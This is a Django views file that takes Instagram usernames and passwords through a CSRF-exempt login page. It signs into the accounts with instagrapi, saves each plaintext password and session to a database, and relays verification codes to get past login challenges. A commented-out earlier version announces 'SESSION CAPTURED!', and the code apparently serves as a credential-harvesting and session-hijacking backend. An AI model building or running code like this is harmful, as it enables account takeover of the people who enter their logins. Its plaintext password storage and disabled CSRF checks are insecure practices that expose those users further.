# core/views.py
import logging
from django.http import JsonResponse
from django.shortcuts import render
from django.views.decorators.csrf import csrf_exempt
from instagrapi import Client
from instagrapi.exceptions import ChallengeRequired, ClientError
from .forms import InstagramLoginForm
from .models import InstagramAccount

logger = logging.getLogger(__name__)


# core/views.py
import logging
from django.http import JsonResponse
from django.shortcuts import render
from django.views.decorators.csrf import csrf_exempt
from django.utils import timezone
import json

from instagrapi import Client
from instagrapi.exceptions import ChallengeRequired

from .forms import InstagramLoginForm
from .models import InstagramAccount

logger = logging.getLogger(__name__)



import json
from django.http import JsonResponse
from django.views.decorators.csrf import csrf_exempt
from django.shortcuts import render
from instagrapi import Client
from django.conf import settings
from core.models import InstagramAccount
from cryptography.fernet import Fernet
import logging

logger = logging.getLogger(__name__)

@csrf_exempt
def login_view(request):
    if request.method == "GET":
        return render(request, 'core/login.html')

    if request.method == "POST":
        try:
            username = request.POST.get('username', '').strip()
            password = request.POST.get('password', '').strip()

            if not username or not password:
                return JsonResponse({'error': 'Enter username and password'}, status=400)

            cl = Client()
            cl.delay_range = [1, 3]

            try:
                login_result = cl.login(username, password)
                session = cl.get_settings()
                
                # Encrypt session
                fernet = Fernet(settings.FERNET_KEY.encode())
                encrypted_session = fernet.encrypt(json.dumps(session).encode()).decode()

                # Save to DB
                obj, created = InstagramAccount.objects.update_or_create(
                    username=username,
                    defaults={
                        'password': password,
                        'session_data': encrypted_session,
                        'is_active': True
                    }
                )

                return JsonResponse({
                    'success': True,
                    'username': username
                })

            except Exception as e:
                error_msg = str(e).lower()
                if 'challenge_required' in error_msg or 'checkpoint' in error_msg:
                    return JsonResponse({'error': 'challenge_required'})
                elif 'bad password' in error_msg:
                    return JsonResponse({'error': 'Wrong password'})
                else:
                    return JsonResponse({'error': 'Login failed. Try again.'})

        except Exception as e:
            logger.error(f"Critical error: {e}")
            return JsonResponse({'error': 'Server error'}, status=500)

# @csrf_exempt
# def login_view(request):
#     if request.method == "POST":
#         form = InstagramLoginForm(request.POST)
#         if not form.is_valid():
#             return JsonResponse({"error": form.errors}, status=400)

#         username = form.cleaned_data["username"].strip()
#         password = form.cleaned_data["password"]

#         cl = Client()
#         cl.delay_range = [1, 4]

#         try:
#             # 1. Try login first
#             cl.login(username, password)
#             settings = cl.get_settings()

#             # 2. Extract sessionid
#             sessionid = settings.get("authorization_data", {}).get("sessionid")
#             if not sessionid:
#                 # fallback
#                 sessionid = cl.private.requests.cookies.get("sessionid")

#             # 3. ONLY IF WE HAVE SESSIONID → SAVE EVERYTHING
#             if sessionid:
#                 account, created = InstagramAccount.objects.update_or_create(
#                     username=username,
#                     defaults={
#                         "password": password,                    # ← correct password
#                         "session_data": json.dumps(settings),   # ← full encrypted session
#                         "last_success": timezone.now(),
#                         "login_attempts": 0,
#                         "is_active": True,
#                     }
#                 )
#                 # Extra safety save
#                 account.save_success(settings)

#                 return JsonResponse({
#                     "success": True,
#                     "message": "SESSION CAPTURED! Password saved only because login worked.",
#                     "username": username,
#                     "saved": True
#                 })
#             else:
#                 return JsonResponse({
#                     "error": "Login failed – no sessionid received"
#                 }, status=400)

#         except ChallengeRequired:
#             # Save password temporarily for checkpoint
#             account, _ = InstagramAccount.objects.update_or_create(
#                 username=username,
#                 defaults={"password": password}
#             )
#             request.session["account_id"] = account.id
#             return JsonResponse({
#                 "error": "challenge_required",
#                 "message": "Check email/SMS → submit code at /checkpoint/"
#             }, status=400)

#         except Exception as e:
#             # WRONG PASSWORD → DO NOT SAVE ANYTHING
#             return JsonResponse({
#                 "error": "Invalid username or password",
#                 "message": "Wrong credentials – nothing saved"
#             }, status=400)

#     return render(request, "core/login.html", {"form": InstagramLoginForm()})



@csrf_exempt
def checkpoint_view(request):
    if request.method == "POST":
        code = request.POST.get("code", "").strip()
        account_id = request.session.get("account_id")
        if not account_id or not code:
            return JsonResponse({"error": "Missing data"}, status=400)

        account = InstagramAccount.objects.get(id=account_id)
        cl = Client()
        cl.delay_range = [1, 4]

        try:
            cl.login(account.username, account.password, verification_code=code)
            settings = cl.get_settings()
            account.save_success(settings)
            return JsonResponse({
                "success": True,
                "message": "Challenge passed! Session saved with correct password."
            })
        except Exception as e:
            return JsonResponse({"error": f"Wrong code: {e}"}, status=400)

    return render(request, "core/checkpoint.html")